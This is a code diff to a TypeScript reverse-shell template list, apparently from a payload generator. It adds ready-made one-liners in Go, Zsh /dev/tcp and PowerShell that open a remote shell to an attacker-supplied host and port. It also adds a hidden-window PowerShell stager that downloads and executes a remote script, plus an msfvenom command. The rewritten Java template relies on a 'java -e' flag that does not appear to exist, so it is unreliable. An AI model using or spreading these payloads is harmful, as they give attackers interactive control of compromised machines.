@@ -74,10 +74,64 @@ export const reverseShellTemplates: ReverseShellTemplate[] = [
     name: "Java Runtime",
     family: "java",
     platform: "multi",
-    description: "Java reverse shell using Runtime exec and socket streams.",
+    description:
+      "Java reverse shell using Runtime.exec and socket redirection.",
     defaultShell: "/bin/sh",
     render: ({ lhost, lport, shell }) =>
-      `jshell -q <<< 'import java.io.*;import java.net.*;var s=new Socket("${lhost}",${lport});var p=Runtime.getRuntime().exec(new String[]{"${shell}","-i"});p.getInputStream().transferTo(s.getOutputStream());'`,
+      `java -e 'var s=new java.net.Socket("${lhost}",${lport});var p=new java.lang.ProcessBuilder(new String[]{"${q(shell)}","-i"}).redirectInput(s.getInputStream()).redirectOutput(s.getOutputStream()).redirectError(s.getOutputStream()).start();p.waitFor();'`,
+  },
+  {
+    id: "golang-tcp",
+    name: "Go TCP reverse shell",
+    family: "go",
+    platform: "multi",
+    description:
+      "Go reverse shell compiled as a one-liner for targets with Go.",
+    defaultShell: "/bin/sh",
+    render: ({ lhost, lport }) =>
+      `echo 'package main;import("net";"os/exec");func main(){c,_:=net.Dial("tcp","${lhost}:${lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go run /tmp/rs.go`,
+  },
+  {
+    id: "zsh-dev-tcp",
+    name: "Zsh /dev/tcp",
+    family: "bash",
+    platform: "linux",
+    description: "Zsh reverse shell using /dev/tcp redirection.",
+    defaultShell: "/bin/zsh",
+    render: ({ lhost, lport, shell }) =>
+      `zsh -c '${shell} -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
+  },
+  {
+    id: "powershell-iex",
+    name: "PowerShell IEX",
+    family: "powershell",
+    platform: "windows",
+    description: "PowerShell reverse shell using Invoke-Expression over TCP.",
+    defaultShell: "powershell.exe",
+    render: ({ lhost, lport }) =>
+      `$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);IEX $d 2>&1|Out-String|%{Write-Host $_};$r=[Text.Encoding]::ASCII.GetBytes($_+'PS '+(pwd).Path+'> ');$s.Write($r,0,$r.Length)};$c.Close()`,
+  },
+  {
+    id: "powershell-downloadstring",
+    name: "PowerShell DownloadString",
+    family: "staged",
+    platform: "windows",
+    description:
+      "Staged PowerShell loader that pulls a script from your HTTP server.",
+    defaultShell: "powershell.exe",
+    render: ({ lhost, httpPort, lport }) =>
+      `powershell -NoP -NonI -W Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:${httpPort ?? lport}/rs.ps1')"`,
+  },
+  {
+    id: "msfvenom-bash",
+    name: "msfvenom Bash",
+    family: "bash",
+    platform: "linux",
+    description:
+      "Generate a Metasploit Bash payload locally, then run the output on the target.",
+    defaultShell: "/bin/bash",
+    render: ({ lhost, lport }) =>
+      `msfvenom -p cmd/unix/reverse_bash LHOST=${lhost} LPORT=${lport} -f raw`,
   },
   {
     id: "awk-tcp",
